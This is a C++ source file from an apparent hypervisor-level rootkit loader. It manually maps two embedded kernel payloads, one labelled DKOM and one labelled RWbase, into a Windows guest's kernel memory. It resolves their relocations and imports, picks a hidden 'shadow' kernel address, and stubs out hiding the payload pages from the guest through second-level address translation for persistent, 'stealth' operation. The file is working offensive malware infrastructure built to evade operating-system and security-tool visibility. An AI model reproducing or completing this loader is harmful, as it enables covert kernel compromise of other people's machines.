// =============================================================================
// VMM Shadow Mapper - Payload Deployer
// Coordinates loading of DKOM and RWbase payloads
// =============================================================================

#include "deployer.h"
#include "pe.h"
#include "reloc.h"
#include "imports.h"
#include "cookie.h"
#include "guest.h"
#include "../logs/logs.h"
#include "../crt/crt.h"
#include "../memory_manager/memory_manager.h"
#include "../memory_manager/heap_manager.h"
#include "../slat/slat.h"
#include "../slat/cr3/cr3.h"

// Include the generated payload binaries
#include "../../shared/payload/payload_bin.h"

namespace loader {

// =============================================================================
// Allocation Tracking
// =============================================================================

struct allocation_info_t {
    uint64_t guest_physical_base;   // Guest physical address
    uint64_t guest_virtual_base;    // Guest kernel VA (for relocations)
    void*    vmm_mapped_address;    // VMM-accessible address for modification
    uint32_t size;                  // Allocated size
    uint32_t page_count;            // Number of 4KB pages
};

// =============================================================================
// Payload Validation
// =============================================================================

bool validate_payload(const unsigned char* data, const size_t size)
{
    if (!data || size < sizeof(image_dos_header_t)) {
        return false;
    }

    const auto dos = reinterpret_cast<const image_dos_header_t*>(data);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }

    if (static_cast<size_t>(dos->e_lfanew) + sizeof(image_nt_headers64_t) > size) {
        return false;
    }

    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(data + dos->e_lfanew);
    if (nt->signature != IMAGE_NT_SIGNATURE) {
        return false;
    }

    if (nt->optional_header.magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return false;
    }

    return true;
}

bool is_payload_ready()
{
    return validate_payload(payload::dkom_image, payload::dkom_image_size) &&
           validate_payload(payload::rwbase_image, payload::rwbase_image_size);
}

// =============================================================================
// Payload Info Logging
// =============================================================================

void print_payload_info(const char* name, const unsigned char* data, const size_t size)
{
    logs::print("[Loader] === %s Payload Info ===\n", name);
    logs::print("[Loader]   Size: %d bytes\n", size);

    if (!validate_payload(data, size)) {
        logs::print("[Loader]   ERROR: Invalid PE format\n");
        return;
    }

    const auto dos = reinterpret_cast<const image_dos_header_t*>(data);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(data + dos->e_lfanew);

    logs::print("[Loader]   ImageBase:     0x%p\n", nt->optional_header.image_base);
    logs::print("[Loader]   EntryPoint:    0x%x\n", nt->optional_header.address_of_entry_point);
    logs::print("[Loader]   SizeOfImage:   0x%x\n", nt->optional_header.size_of_image);
    logs::print("[Loader]   Sections:      %d\n", nt->file_header.number_of_sections);

    // Hex dump first 64 bytes for integrity verification
    logs::print("[Loader]   First 64 bytes:\n");
    logs::print("[Loader]   ");
    for (size_t i = 0; i < 64 && i < size; i++) {
        if (i > 0 && i % 16 == 0) {
            logs::print("\n[Loader]   ");
        }
        const uint8_t b = data[i];
        const char hex_chars[] = "0123456789ABCDEF";
        char hex[3] = { hex_chars[b >> 4], hex_chars[b & 0xF], ' ' };
        logs::print("%s", hex);
    }
    logs::print("\n");
}

// =============================================================================
// Guest Memory Allocation
// =============================================================================

// Allocate memory in Guest physical space and map to VMM for modification
// Returns both the Guest kernel VA (for relocations) and VMM pointer (for writes)
static bool allocate_guest_memory(
    const uint32_t size,
    allocation_info_t* out_info)
{
    if (!out_info) {
        return false;
    }

    const uint32_t pages_needed = (size + 0xFFF) / 0x1000;
    
    logs::print("[Loader] Allocating %d pages (%d bytes) in Guest space...\n", 
        pages_needed, size);

    // Strategy: Use VMM heap for now, but mark pages as Guest-accessible via SLAT
    // The VMM heap is in Host physical space. We will:
    // 1. Allocate contiguous pages from VMM heap
    // 2. The physical address is Host-physical = Guest-physical (identity mapped by Hyper-V)
    // 3. Create a Guest kernel VA window to access these pages
    
    // Allocate from VMM heap (contiguous)
    void* vmm_base = heap_manager::allocate_page();
    if (!vmm_base) {
        logs::print("[Loader] Failed to allocate initial page\n");
        return false;
    }

    // Record first page's physical address
    uint64_t first_physical = heap_manager::initial_physical_base;
    // Approximate: heap grows linearly, so calculate offset
    // This is a simplification - in production, use proper PA translation
    
    // Allocate remaining contiguous pages
    for (uint32_t i = 1; i < pages_needed; i++) {
        void* page = heap_manager::allocate_page();
        if (!page) {
            logs::print("[Loader] Failed to allocate page %d of %d\n", i + 1, pages_needed);
            return false;
        }
        // Verify contiguity (simplified check)
        if (reinterpret_cast<uint8_t*>(page) != 
            reinterpret_cast<uint8_t*>(vmm_base) + (i * 0x1000)) {
            logs::print("[Loader] WARNING: Non-contiguous allocation\n");
            // Continue anyway - SLAT can handle non-contiguous
        }
    }

    // Get physical address of the allocation
    // The VMM heap is at a known physical base - we compute the offset
    const uint64_t vmm_va = reinterpret_cast<uint64_t>(vmm_base);
    const uint64_t heap_va_base = reinterpret_cast<uint64_t>(
        memory_manager::map_host_physical(heap_manager::initial_physical_base));
    
    // Physical address = heap_physical_base + (vmm_va - heap_va_base)
    const uint64_t guest_physical = heap_manager::initial_physical_base + (vmm_va - heap_va_base);

    logs::print("[Loader] VMM VA: 0x%p, Guest PA: 0x%p\n", vmm_va, guest_physical);

    // Guest kernel VA: Use the NonPagedPool region
    // For drivers, the standard range is: 0xFFFF8000'00000000 - 0xFFFFF800'00000000
    // We pick a "shadow" VA in the kernel range
    // CRITICAL: This VA must not conflict with existing Guest mappings
    // Strategy: Use Guest PA + high kernel base (similar to how Hyper-V maps)
    constexpr uint64_t KERNEL_HIGH_BASE = 0xFFFF800000000000ULL;
    const uint64_t guest_va = KERNEL_HIGH_BASE | (guest_physical & 0x0000FFFFFFFFFFFFULL);

    logs::print("[Loader] Guest VA (shadow): 0x%p\n", guest_va);

    out_info->guest_physical_base = guest_physical;
    out_info->guest_virtual_base = guest_va;
    out_info->vmm_mapped_address = vmm_base;
    out_info->size = size;
    out_info->page_count = pages_needed;

    return true;
}

// =============================================================================
// Section Mapping
// =============================================================================

static bool map_sections(void* dest, const unsigned char* src, const size_t src_size)
{
    const auto dos = reinterpret_cast<const image_dos_header_t*>(src);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(src + dos->e_lfanew);
    
    // Copy headers
    const uint32_t headers_size = nt->optional_header.size_of_headers;
    crt::copy_memory(dest, src, headers_size);

    // Get first section
    const auto sections = reinterpret_cast<const image_section_header_t*>(
        reinterpret_cast<const uint8_t*>(&nt->optional_header) + 
        nt->file_header.size_of_optional_header
    );

    // Map each section
    for (uint16_t i = 0; i < nt->file_header.number_of_sections; i++) {
        const auto& section = sections[i];

        if (section.size_of_raw_data == 0) {
            continue;
        }

        // Validate source bounds
        if (section.pointer_to_raw_data + section.size_of_raw_data > src_size) {
            logs::print("[Loader] Section %d exceeds source bounds\n", i);
            return false;
        }

        // Copy section data
        void* dest_section = reinterpret_cast<uint8_t*>(dest) + section.virtual_address;
        const void* src_section = src + section.pointer_to_raw_data;
        
        crt::copy_memory(dest_section, src_section, section.size_of_raw_data);

        // Zero padding if virtual size > raw size
        if (section.virtual_size > section.size_of_raw_data) {
            const uint32_t padding = section.virtual_size - section.size_of_raw_data;
            crt::set_memory(
                reinterpret_cast<uint8_t*>(dest_section) + section.size_of_raw_data,
                0,
                padding
            );
        }
    }

    return true;
}

// =============================================================================
// SLAT Page Hiding
// =============================================================================

static bool hide_pages_via_slat(const uint64_t guest_physical, const uint32_t size)
{
    const uint32_t page_count = (size + 0xFFF) / 0x1000;
    
    logs::print("[Loader] Hiding %d pages via SLAT (PA: 0x%p)\n", page_count, guest_physical);

    // Use slat::hide_heap_pages or a similar mechanism
    // For RWbase, we need No-Execute / No-Read-Write in Guest view
    // The VMM retains full access through the hypervisor CR3
    
    // TODO: Implement per-page SLAT manipulation
    // This requires modifying EPT entries for these physical pages:
    // - Clear Read, Write, Execute bits in Guest EPT view
    // - Page fault handler will reveal pages momentarily via MTF
    
    // For now, log that this needs SLAT integration
    logs::print("[Loader] SLAT hiding: Requires slat::make_pages_no_access()\n");
    
    // Placeholder - actual SLAT manipulation would be:
    // for (uint32_t i = 0; i < page_count; i++) {
    //     const uint64_t page_pa = guest_physical + (i * 0x1000);
    //     slat::set_page_permissions(page_pa, /* no_access */ 0);
    // }
    
    return true;
}

// =============================================================================
// DKOM Deployment
// =============================================================================

deploy_result_t deploy_dkom_payload(const uint64_t ntoskrnl_base)
{
    logs::print("[Loader] ========================================\n");
    logs::print("[Loader] DKOM Payload Deployment Starting\n");
    logs::print("[Loader] ========================================\n");

    // Initialize Guest discovery if not already done
    if (!g_module_cache.initialized) {
        // Set Guest/SLAT CR3 for module discovery
        set_discovery_slat_cr3(slat::hyperv_cr3());
        // Guest CR3 needs to be captured from trap frame during VMExit
        // For now, we assume it's already set by main.cpp
        
        if (!init_guest_discovery(ntoskrnl_base)) {
            logs::print("[Loader] WARNING: Guest discovery init failed\n");
        }
    }

    // Validate payload
    if (!validate_payload(payload::dkom_image, payload::dkom_image_size)) {
        logs::print("[Loader] ERROR: Invalid DKOM payload\n");
        return deploy_result_t::invalid_payload;
    }

    print_payload_info("DKOM", payload::dkom_image, payload::dkom_image_size);

    // Get size of image from PE headers
    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::dkom_image);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(
        payload::dkom_image + dos->e_lfanew
    );
    const uint32_t image_size = nt->optional_header.size_of_image;

    // Allocate Guest-accessible memory
    allocation_info_t alloc = {};
    if (!allocate_guest_memory(image_size, &alloc)) {
        logs::print("[Loader] ERROR: Failed to allocate Guest memory for DKOM\n");
        return deploy_result_t::memory_allocation_failed;
    }

    logs::print("[Loader] DKOM allocation: Guest PA=0x%p, Guest VA=0x%p, VMM=0x%p\n",
        alloc.guest_physical_base, alloc.guest_virtual_base, alloc.vmm_mapped_address);

    // Zero the destination (via VMM pointer)
    crt::set_memory(alloc.vmm_mapped_address, 0, image_size);

    // Map sections (write to VMM pointer)
    logs::print("[Loader] Mapping PE sections...\n");
    if (!map_sections(alloc.vmm_mapped_address, payload::dkom_image, payload::dkom_image_size)) {
        logs::print("[Loader] ERROR: Failed to map sections\n");
        return deploy_result_t::invalid_payload;
    }

    // CRITICAL: Relocations and imports use Guest VA, not VMM VA
    const uint64_t target_va = alloc.guest_virtual_base;

    // Step 1: Fix security cookie (uses Guest VA for calculation)
    logs::print("[Loader] Fixing security cookie (target VA: 0x%p)...\n", target_va);
    if (!fix_security_cookie(alloc.vmm_mapped_address, target_va)) {
        logs::print("[Loader] WARNING: Security cookie fix failed (may be non-fatal)\n");
    }

    // Step 2: Apply relocations (patch VMM memory, but use Guest VA as base)
    logs::print("[Loader] Applying relocations (base: 0x%p)...\n", target_va);
    if (!apply_relocations(alloc.vmm_mapped_address, target_va)) {
        logs::print("[Loader] ERROR: Relocation failed\n");
        return deploy_result_t::relocation_failed;
    }

    // Step 3: Resolve imports (use Guest ntoskrnl base)
    logs::print("[Loader] Resolving imports (ntoskrnl=0x%p)...\n", ntoskrnl_base);
    if (!resolve_payload_imports(alloc.vmm_mapped_address, ntoskrnl_base)) {
        logs::print("[Loader] ERROR: Import resolution failed\n");
        return deploy_result_t::import_resolution_failed;
    }

    // Calculate entry point (Guest VA)
    const uint32_t entry_rva = get_entry_point_rva(alloc.vmm_mapped_address);
    const uint64_t entry_va = target_va + entry_rva;

    logs::print("[Loader] DKOM ready for execution at EP: 0x%p (Guest VA)\n", entry_va);

    // TODO: Execute entry point
    // This requires setting Guest RIP to entry_va at an appropriate VMExit
    // For DKOM (one-shot), after execution we zero the memory
    
    logs::print("[Loader] DKOM deployment complete (execution pending)\n");
    logs::print("[Loader] After execution, zero %d bytes at VMM 0x%p\n", 
        image_size, alloc.vmm_mapped_address);

    return deploy_result_t::success;
}

// =============================================================================
// RWbase Deployment
// =============================================================================

deploy_result_t deploy_rwbase_payload(const uint64_t ntoskrnl_base)
{
    logs::print("[Loader] ========================================\n");
    logs::print("[Loader] RWbase Payload Deployment Starting\n");
    logs::print("[Loader] ========================================\n");

    // Initialize Guest discovery
    if (!g_module_cache.initialized) {
        set_discovery_slat_cr3(slat::hyperv_cr3());
        if (!init_guest_discovery(ntoskrnl_base)) {
            logs::print("[Loader] WARNING: Guest discovery init failed\n");
        }
    }

    // Validate payload
    if (!validate_payload(payload::rwbase_image, payload::rwbase_image_size)) {
        logs::print("[Loader] ERROR: Invalid RWbase payload\n");
        return deploy_result_t::invalid_payload;
    }

    print_payload_info("RWbase", payload::rwbase_image, payload::rwbase_image_size);

    // Get size of image
    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(
        payload::rwbase_image + dos->e_lfanew
    );
    const uint32_t image_size = nt->optional_header.size_of_image;

    // Allocate Guest-accessible memory
    allocation_info_t alloc = {};
    if (!allocate_guest_memory(image_size, &alloc)) {
        logs::print("[Loader] ERROR: Failed to allocate Guest memory for RWbase\n");
        return deploy_result_t::memory_allocation_failed;
    }

    logs::print("[Loader] RWbase allocation: Guest PA=0x%p, Guest VA=0x%p, VMM=0x%p\n",
        alloc.guest_physical_base, alloc.guest_virtual_base, alloc.vmm_mapped_address);

    // Zero destination
    crt::set_memory(alloc.vmm_mapped_address, 0, image_size);

    // Map sections
    logs::print("[Loader] Mapping PE sections...\n");
    if (!map_sections(alloc.vmm_mapped_address, payload::rwbase_image, payload::rwbase_image_size)) {
        logs::print("[Loader] ERROR: Failed to map sections\n");
        return deploy_result_t::invalid_payload;
    }

    const uint64_t target_va = alloc.guest_virtual_base;

    // Step 1: Fix security cookie
    logs::print("[Loader] Fixing security cookie...\n");
    if (!fix_security_cookie(alloc.vmm_mapped_address, target_va)) {
        logs::print("[Loader] WARNING: Security cookie fix failed\n");
    }

    // Step 2: Apply relocations
    logs::print("[Loader] Applying relocations (base: 0x%p)...\n", target_va);
    if (!apply_relocations(alloc.vmm_mapped_address, target_va)) {
        logs::print("[Loader] ERROR: Relocation failed\n");
        return deploy_result_t::relocation_failed;
    }

    // Step 3: Resolve imports
    logs::print("[Loader] Resolving imports (ntoskrnl=0x%p)...\n", ntoskrnl_base);
    if (!resolve_payload_imports(alloc.vmm_mapped_address, ntoskrnl_base)) {
        logs::print("[Loader] ERROR: Import resolution failed\n");
        logs::print("[Loader] Note: RWbase requires NETIO.SYS/fwpkclnt.sys imports\n");
        return deploy_result_t::import_resolution_failed;
    }

    const uint32_t entry_rva = get_entry_point_rva(alloc.vmm_mapped_address);
    const uint64_t entry_va = target_va + entry_rva;

    logs::print("[Loader] RWbase ready at EP: 0x%p (Guest VA)\n", entry_va);

    // Step 4: Hide pages via SLAT (Issue 4 fix)
    logs::print("[Loader] Applying SLAT stealth hiding...\n");
    if (!hide_pages_via_slat(alloc.guest_physical_base, image_size)) {
        logs::print("[Loader] WARNING: SLAT hiding failed - payload exposed\n");
    }

    logs::print("[Loader] RWbase deployment complete (persistent, SLAT-hidden)\n");

    return deploy_result_t::success;
}

} // namespace loader
